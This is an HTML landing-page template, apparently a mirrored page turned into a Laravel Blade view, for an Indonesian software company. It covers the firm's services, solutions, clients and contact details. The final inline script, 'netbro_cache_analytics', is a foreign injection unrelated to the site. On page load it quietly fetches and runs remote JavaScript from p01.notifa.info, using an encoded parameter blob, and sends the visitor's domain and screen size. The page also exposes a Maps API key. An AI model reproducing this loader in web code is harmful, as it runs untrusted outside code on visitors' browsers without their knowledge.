<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from husain100b.com/templates/expro/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 27 Jun 2019 03:01:49 GMT -->
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<title> PT.Noxus Ideata Pratama </title>

	<!-- favicon -->
	<!-- <link rel="shortcut icon" type="image/x-icon" href="favicon.ico"> -->

	<!-- Styles -->
	<link rel="stylesheet" href="{{ asset('expro-css/font-awesome.min.css') }}">
	<link rel="stylesheet" href="{{ asset('expro-css/ionicons.min.css') }}">
	<link rel="stylesheet" href="{{ asset('expro-css/et-line.css') }}">
	<link rel="stylesheet" href="{{ asset('expro-css/magnific-popup.css') }}">
	<link rel="stylesheet" href="{{ asset('expro-css/owl.carousel.min.css') }}">
	<link rel="stylesheet" href="{{ asset('expro-css/owl.theme.default.min.css') }}">
	<link rel="stylesheet" href="{{ asset('expro-css/bootstrap.min.css') }}">
	<link rel="stylesheet" href="{{ asset('expro-css/style.css') }}">
	<link rel="stylesheet" href="{{ asset('expro-css/responsive.css') }}">

</head>
<body id="wrap" data-spy='scroll' data-target='#navbar-header' data-offset='0'>
	<!-- preloader-wrapper start -->
	<div class="preloader-wrapper">
		<div class="spinner"></div>
	</div>
	<!-- preloader-wrapper end -->

	<!-- Header-area -->
	<header id="header-area" data-scroll-index="0" class="header-img-bg">
		<!-- header-navigation -->
		<div class="container z-index">
			<nav id="navbar-header" class="navbar navbar-expand-lg">
				<a class="navbar-brand" href="#"><img src="{{ asset('images/logo_noxus.png') }}" style="max-height:50px"></a>
				<button class="responsive-nav-btn navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
					<span class="ion-navicon"></span>
				</button>
			</nav>
		</div> 
	</header>

	<!-- about-us-section -->
	<section id="about-us-section" data-scroll-index="1">
		<div class="container">
			<div class="row">
				<div class="col-lg-6">
					<div class="aboutus-text">
						<h3>About Us</h3>
						<p>Passion, smart work, perseverance.</p>
						<p>We are group of tech savvy with a hearty passion in information technology, particularly in software development.</p>
						<p>We provide wide range of software solutions on desktop, web, and mobile platform.</p>
						<p>With more than 5 years of experience, we strive to provide the best in terms of product and service quality to our client.</p>
						<!-- <a class="about-btn" href="#">Learn more</a> -->
					</div>
				</div>
				<div class="col-lg-6">
					<div class="about-img">
						<svg width="530" height="360">
						    <defs>
						        <clipPath id="polygonView">
						            <polygon fill="#fff" points="0 0, 1000 0, 1000 1000, 150 1000"></polygon>
						        </clipPath>
						    </defs>
							<image width="530" height="360" xlink:href="{{ asset('expro-img/about-us/front-img.jpg') }}" clip-path="url(#polygonView)" />

						 </svg>
					</div>
				</div>
			</div>
		</div>
	</section>
	<!-- /about-us-section -->

	<!-- service-area -->
	<section id="service-area" data-scroll-index="2">
		<div class="container">
			<div class="row">
				<div class="col-md-12">
					<div class="section-heading">
						<h2>Our <span class="section-heading-style">Services</span></h2>
					</div>
				</div>
			</div>
			<div class="row display-flex">
				<div class="col-lg-4 col-md-6">
					<div class="single-service">
						<div class="service-icon">
							<i class="icon ion-ios-speedometer-outline"></i>
						</div>
						<h4>Software Development & Optimalization</h4>
						<p>We develop robust desktop, web, and mobile application based on your requirements using well proven and open technology</p>
					</div>
				</div>
				<div class="col-lg-4 col-md-6">
					<div class="single-service">
						<div class="service-icon">
							<i class="icon ion-ios-browsers-outline"></i>
						</div>
						<h4>Server Monitoring, Reposting, Opsimisation</h4>
						<p>We monitor your server performance, network, storage, and offer recommendation for optimisations & improvements.</p>
					</div>
				</div>
				<div class="col-lg-4 col-md-6">
					<div class="single-service">
					<div class="service-icon">
						<i class="icon ion-ios-pulse"></i>
					</div>
					<h4>UI/UX & Implementation</h4>
					<p>We crate beautiful & intuitive interface using user-created approach. It's about visuals and the experience behind it.</p>
					</div>
				</div>
			</div>
		</div>
	</section><!-- /service-area -->

	<!-- portfolio-area start -->
	<section id="portfolio-area" data-scroll-index="3">
		<div class="container">
			<div class="row">
				<div class="col-md-12">
					<div class="section-heading">
						<h2>Our <span class="section-heading-style">Solutions</span></h2>
					</div>
				</div>
			</div>
		</div>
		<div class="container">
			<div class="row gallery">
				<div class="col-lg-3 col-md-6" data-tag='pink'>
					<div class="single-service solution">
						<div class="service-icon">
							<i class="sol-icon ion-android-phone-portrait"></i>
						</div>
						<h4 class="sol">Mobile Application</h4>
					</div>
				</div>
				<div class="col-lg-3 col-md-6" data-tag='red'>
					<div class="single-service solution">
						<div class="service-icon">
							<i class="sol-icon ion-filing"></i>
						</div>
						<h4 class="sol">Information System</h4>
					</div>
				</div>
				<div class="col-lg-3 col-md-6" data-tag='blue'>
					<div class="single-service solution">
						<div class="service-icon">
							<i class="sol-icon ion-ios-cart-outline"></i>
						</div>
						<h4 class="sol">e-Commerce System</h4>
					</div>
				</div>
				<div class="col-lg-3 col-md-6" data-tag='green'>
					<div class="single-service solution">
						<div class="service-icon">
							<i class="sol-icon ion-android-globe"></i>
						</div>
						<h4 class="sol">Corporate Website</h4>
					</div>
				</div>
				<div class="col-lg-3 col-md-6" data-tag='blue'>
					<div class="single-service solution">
						<div class="service-icon">
							<i class="sol-icon ion-android-settings"></i>
						</div>
						<h4 class="sol">Custom Software Development</h4>
					</div>
				</div>
				<div class="col-lg-3 col-md-6" data-tag='pink'>
					<div class="single-service solution">
						<div class="service-icon">
							<i class="sol-icon ion-android-wifi"></i>
						</div>
						<h4 class="sol">Microservice</h4>
					</div>
				</div>
				<div class="col-lg-3 col-md-6" data-tag='green'>
					<div class="single-service solution">
						<div class="service-icon">
							<i class="sol-icon ion-network"></i>
						</div>
						<h4 class="sol">Deployment & Integration</h4>
					</div>
				</div>
				<div class="col-lg-3 col-md-6" data-tag='blue'>
					<div class="single-service solution">
						<div class="service-icon">
							<i class="sol-icon ion-android-download"></i>
						</div>
						<h4 class="sol">Server Migration</h4>
					</div>
				</div>
				<div class="col-lg-3 col-md-6 offset-lg-3" data-tag='pink'>
					<div class="single-service solution">
						<div class="service-icon">
							<i class="sol-icon ion-ios-cog"></i>
						</div>
						<h4 class="sol">Server Maintenace</h4>
					</div>
				</div>
				<div class="col-lg-3 col-md-6" data-tag='pink'>
					<div class="single-service solution">
						<div class="service-icon sol-icon">
							<i class="sol-icon ion-ios-person"></i>
						</div>
						<h4 class="sol">UI/UX Prototype</h4>
					</div>
				</div>
			</div>
		</div>
	</section> <!-- portfolio-area end -->

	<!-- portfolio-area start -->
	<section id="client-area" data-scroll-index="4">
		<div class="container">
			<div class="row">
				<div class="col-md-12">
					<div class="section-heading">
						<h2>Our <span class="section-heading-style">Clients</span></h2>
					</div>
				</div>
			</div>
		</div>
		<div class="container">
			<div class="row gallery">
				<div class="col-lg-2 col-md-6" data-tag='pink'>
					<img src="{{ asset('images/unilever.png') }}" style="max-height:100%;width:auto">
				</div>
				<div class="col-lg-2 col-md-6" data-tag='pink'>
					<img src="{{ asset('images/pgaskom.jpg') }}" style="max-height:100%;width:auto">
				</div>
				<div class="col-lg-2 col-md-6" data-tag='pink'>
					<img src="{{ asset('images/pgnmas.jpg') }}" style="max-height:100%;width:auto">
				</div>
				<div class="col-lg-2 col-md-6" data-tag='pink'>
					<img src="{{ asset('images/bbws.png') }}"  style="max-height:100%;width:auto">
				</div>
				<div class="col-lg-2 col-md-6" data-tag='pink'>
					<img src="{{ asset('images/tj.png') }}"  style="max-height:100%;width:auto">
				</div>
				<div class="col-lg-2 col-md-6" data-tag='pink'>
					<img src="{{ asset('images/bi.png') }}"  style="max-height:100%;width:auto">
				</div>
				<div class="col-lg-2 col-md-6" data-tag='pink'>
					<img src="{{ asset('images/bni.png') }}"  style="max-height:100%;width:auto">
				</div>
				<div class="col-lg-2 col-md-6" data-tag='pink'>
					<img src="{{ asset('images/btpn.png') }}"  style="max-height:100%;width:auto">
				</div>
				<div class="col-lg-2 col-md-6" data-tag='pink'>
					<img src="{{ asset('images/zetabag.jpg') }}"  style="max-height:100%;width:auto">
				</div>
			</div>
		</div>
	</section> <!-- portfolio-area end -->

	<!-- contact-area -->
	<section id="contact-area" data-scroll-index="5">
		<div class="container z-index">
			<div class="contact-form">
				<div class="row">
					<div class="col-md-6">
						<form action="#">
							<div class="row">
								<div class="col-md-6">
									<input type="text" name="name" placeholder="Name">	
								</div>
								<div class="col-md-6">
									<input type="email" name="email" placeholder="Email">
								</div>
								<div class="col-md-12">
									<input type="text" name="subject" placeholder="Subject">
								</div>
								<div class="col-md-12">
									<textarea name="msg" id="msg" placeholder="Message" ></textarea>
								</div>
								<div class="col-md-12">
									<button class="submit-icon" type="submit">
										SEND
										<i class="submit-icon ion-paper-airplane"></i>
									</button>
								</div>
							</div>
						</form>
					</div>
					<div class="col-md-6">
						<div class="row">
							<div class="col-md-12">
								<h4 class="info">PT.Noxus Ideata Prima</h4>
								<p class="info">Jl.Maleo XIII, Blok JC 7 no.22, Bintaro Jaya, Pondok Pucung, Pondok Aren, Kota Tangerang Selatan, Banten Indonesia, 15229</p>
								<p class="info"><i class="ion-ios-telephone"></i>+62 21 222 11 697</p>
								<p class="info"><i class="ion-android-mail"></i> info@noxus.co.id</p>
							</div>
						</div>
						<div class="row">
							<div class="col-md-12">
								<div id="map"></div>	
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</section>
	<!-- /contact-area -->

	<!-- footer-area -->
	<footer id="footer-area">
		<div class="copyright-area">
			<div class="col-md-12">
				<p>&copy; Noxus @ 2019</p>
			</div>
		</div>
	</footer><!-- /footer-area -->

	<!-- scripts -->
	<script src="{{ asset('expro-js/jquery-3.2.1.min.js') }}"></script>
	<script src="{{ asset('expro-js/jquery-migrate-3.0.0.js') }}"></script>
	<script src="{{ asset('expro-js/popper-1.11.0.min.js') }}"></script>
	<script src="{{ asset('expro-js/bootstrap.min.js') }}"></script>
	<script src="{{ asset('expro-js/owl.carousel.min.js') }}"></script>
	<script src="{{ asset('expro-js/bootstrap-portfilter.min.js') }}"></script>
	<script src="{{ asset('expro-js/waypoints-2.0.3.min.js') }}"></script>
	<script src="{{ asset('expro-js/jquery.counterup.min.js') }}"></script>
	<script src="{{ asset('expro-js/jquery.magnific-popup.min.js') }}"></script>
	<script src="{{ asset('expro-js/jquery.scrollUp.min.js') }}"></script>
	<script src="{{ asset('expro-js/scrollIt.min.js') }}"></script>
	<script src="{{ asset('expro-js/map.js') }}"></script>
	<script src="{{ asset('expro-js/active.js') }}"></script>

  <script async defer src="https://maps.googleapis.com/maps/api/js?key=AIzaSyBb_dmpinPEmGxRxLHIBGOLW3KL9roU8rA&amp;callback=initMap">
  </script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH280xx1lxWXtIbwCSUL%2fSi0l3sA4g3l14oCiwCYIDGkqaMnhf1CeAzLCXmW%2fdjyYhQHs8a%2b789M6iUP9qWpEZUwSvUClzC0t0mlqvWDEqSSngabaW9bjNKP6pRY7C7iQseLBfnhdS55bJVGV5e%2b%2fIBsxiYYFHUyFlbYb68c64IuRoypec%2bW5vtnbJXJtwGEdUI4Qm7tKXsUUDO5AXplTWjvHm1l6jhC6r%2fur1%2b1AjLXSV%2ff4KGVpMgIeS4ocvNQlKg8I%2fNoSw9kW7e0HliEXvn6c3Y0seORhC8ACvRzeCUgwF1MtAjF7gooGKqK%2b3n8i9gUEvsQqMttSoohdZSkAn2AtI9HWniPm9YDN7dxq29Uc4xW96jnPXS4mXqA6Y6znLuoaftoM6ej7XrFr6q5mqDIGbBZNnkuJjABv6WCCoGwpnUloJ5v7ndbP5FjLeOa0vbEyID9An1IO8JOARmMeziRsKRPYiGBkrtcGSWMiKUGas%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from husain100b.com/templates/expro/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 27 Jun 2019 03:02:27 GMT -->
</html>